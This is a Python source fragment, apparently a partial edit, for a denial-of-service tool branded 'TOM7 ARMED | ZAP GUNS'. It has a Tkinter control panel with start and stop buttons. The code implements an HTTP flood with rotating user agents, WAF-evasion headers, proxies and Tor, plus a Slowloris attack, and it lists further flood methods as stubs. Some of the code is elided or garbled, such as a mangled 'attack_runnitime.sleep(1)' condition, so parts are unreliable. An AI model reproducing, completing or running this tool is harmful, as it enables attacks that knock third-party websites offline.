# ...existing code...
import random
import logging
import string
import tkinter as tk
from tkinter import font as tkfont
import time
import os
import sys
# ...existing code...
# ------------------------GLOBAL ATTACK METHODS------------------------

class AttackMethods:
    @staticmethod
    def http_flood(target, duration, threads, proxy, use_tor, attack_running):
        end_time = time.time() + duration
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        try:
            ipaddr = socket.gethostbyname(host) if host else socket.gethostname()
        except Exception:
            ipaddr = socket.gethostname()

        def attack():
            while time.time() < end_time and attack_running.is_set():
                try:
                    if use_tor:
                        setup_tor()
                    session = requests.Session()
                    if proxy:
                        session.proxies = {"https": proxy}
                    headers = {"User-Agent": random.choice(user_agents)}
                    headers.update(evade_waf())
                    session.headers.update(headers)
                    session.get(target + f"?{''.join(random.choices(string.ascii_lowercase, k=10))}", timeout=3, verify=False)
                    increment_request_count(1)
                    logging.info(f"\r{Fore.RED}[{Fore.CYAN} {next(spinner)} {Fore.RED}] {Fore.MAGENTA} HTTP Flood Attack Sent To TARGET: {Fore.GREEN} {target} {Fore.MAGENTA} PORT: {Fore.GREEN} {port} {Fore.MAGENTA} TARGET IP ADDRESS: {Fore.GREEN} {ipaddr} {Fore.RESET}")
                except Exception as e:
                    logging.debug(f"HTTP Flood Error: {e}")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                if not attack_running.is_set():
                    break
                executor.submit(attack)

    @staticmethod
    def slowloris(target, duration, attack_running, sockets=500):
        end_time = time.time() + duration
        sockets_list = []
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        try:
            ipaddr = socket.gethostbyname(host) if host else socket.gethostname()
        except Exception:
            ipaddr = socket.gethostname()
        url_path = generate_url_path()

        def create_socket():
            # ... (create_socket implementation remains the same)
            pass

        for _ in range(sockets):
            if not attack_running.is_set():
                break
            sock = create_socket()
            if sock:
                sockets_list.append(sock)
        while time.time() < end_time and attack_running.is_set():
            for s in sockets_list[:]:
                if not attack_running.is_set():
                    break
                try:
                    s.send(f"X-a: {random.randint(1, 10000)}\r\n".encode())
                    increment_request_count(1)
                except Exception:
                    sockets_list.remove(s)
                    new_sock = create_socket()
                    if new_sock:
                        sockets_list.append(new_sock)
            time.sleep(10)

    # --- NOTE: Apply the same `attack_running` logic to other attack methods ---
    # (massive_payload, rudy, xmlrpc_flood)
    # Example for massive_payload:
    @staticmethod
    def massive_payload(target, duration, threads, proxy, attack_running):
        end_time = time.time() + duration
        # ...
        def attack():
            while time.time() < end_time and attack_runnitime.sleep(1).is_set():
                # ... (rest of the attack logic)
                pass
        # ...

# ------------------------GLOBAL GUI DISPLAY CONFIGURATIONS------------------------
# ------------------------TKINTER WINDOWS | WEB CONTROLS PANEL------------------------

class TOM7ARMEDGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("TOM7 ARMED | ZAP GUNS")
        self.attack_running = threading.Event()
        self.root.configure(bg='#1a1a1a')
        window_width = 800
        window_height = 650
        main_frame = tk.Frame(root, bg='#1a1a1a')
        main_frame.pack(expand=True, fill='both', padx=20, pady=20)
        self.target_var = tk.StringVar()
        self.duration_var = tk.StringVar(value="60")
        self.threads_var = tk.StringVar(value="100")
        self.method_var = tk.StringVar(value="HTTP Flood")
        self.tor_var = tk.BooleanVar()
        title_font = tkfont.Font(family="Helvetica", size=16, weight="bold")
        label_font = tkfont.Font(family="Helvetica", size=12)
        tk.Label(main_frame, text="TOM7 ARMED CONTROL PANEL", font=title_font, fg="#00ff00", bg="#1a1a1a").pack(pady=10)
        tor_frame = tk.Frame(main_frame, bg='#1a1a1a')
        tor_frame.pack(pady=10)
        tk.Checkbutton(tor_frame, 
                      text="TOR Proxies",
                      variable=self.tor_var,
                      command=self.update_tor_status,
                      fg="#00ff00", bg="#1a1a1a", selectcolor="#1a1a1a",
                      activebackground="#1a1a1a", activeforeground="#00ff00",
                      font=label_font).pack(side='left', padx=10)

        self.tor_status_label = tk.Label(tor_frame, text="TOR: INACTIVE", font=label_font, fg="red", bg="#1a1a1a")
        self.tor_status_label.pack(side='left', padx=10)
        self.update_tor_status() # Set initial state

        # Buttons Frame
        button_frame = tk.Frame(main_frame, bg='#1a1a1a')
        button_frame.pack(pady=20)

        # Start Button
        self.start_btn = tk.Button(button_frame, text="START ATTACK", command=self.start_attack, font=label_font, bg="#007acc", fg="white", width=15)
        self.start_btn.pack(side='left', padx=10)
        self.start_btn.bind("<Enter>", lambda e: self.start_btn.config(bg="#005999"))
        self.start_btn.bind("<Leave>", lambda e: self.start_btn.config(bg="#007acc"))

        # Stop Button
        self.stop_btn = tk.Button(button_frame, text="STOP", command=self.stop_attack, font=label_font, bg="#cc2000", fg="white", width=15, state='disabled')
        self.stop_btn.pack(side='left', padx=10)
        self.stop_btn.bind("<Enter>", lambda e: self.stop_btn.config(bg="#991500") if self.stop_btn['state'] != 'disabled' else None)
        self.stop_btn.bind("<Leave>", lambda e: self.stop_btn.config(bg="#cc2000") if self.stop_btn['state'] != 'disabled' else None)

    def update_tor_status(self):
        if self.tor_var.get():
            self.tor_status_label.config(text="TOR: ACTIVE", fg="green")
        else:
            self.tor_status_label.config(text="TOR: INACTIVE", fg="red")

    def start_attack(self):
        # ... (Input validation code remains the same) ...
        target = self.target_var.get()
        # ...

        self.attack_running.set() # Signal for attack to start/continue
        self.start_btn.config(state='disabled')
        self.stop_btn.config(state='normal')

        attack_thread = threading.Thread(
            target=self._run_attack,
            args=(method, target, duration, threads, proxy, use_tor, self.attack_running),
            daemon=True
        )
        attack_thread.start()
        messagebox.showinfo("Started", f"Attack Launched To {target} Using {method} Methods")

    def stop_attack(self):
        messagebox.showinfo("Stopping", "Sending stop signal to all processes...")
        self.attack_running.clear() # Signal for attack to stop
        self.stop_btn.config(state='disabled')
        # The _run_attack finally block will re-enable the start button

    def _run_attack(self, method, target, duration, threads, proxy, use_tor, attack_running):
        """Helper method to run the attack and handle cleanup."""
        try:
            if method == "HTTP Flood":
                AttackMethods.http_flood(target, duration, threads, proxy, use_tor, attack_running)
            elif method == "Slowloris":
                AttackMethods.slowloris(target, duration, attack_running)
            # ... (add attack_running to other method calls) ...
        finally:
            # This block runs whether the attack finishes or is stopped
            # Use root.after to safely update GUI from a different thread
            self.root.after(0, self.reset_buttons)

    def reset_buttons(self):
        """Safely reset button states from any thread."""
        self.start_btn.config(state='normal')
        self.stop_btn.config(state='disabled')

# ... (rest of the script remains the same) ...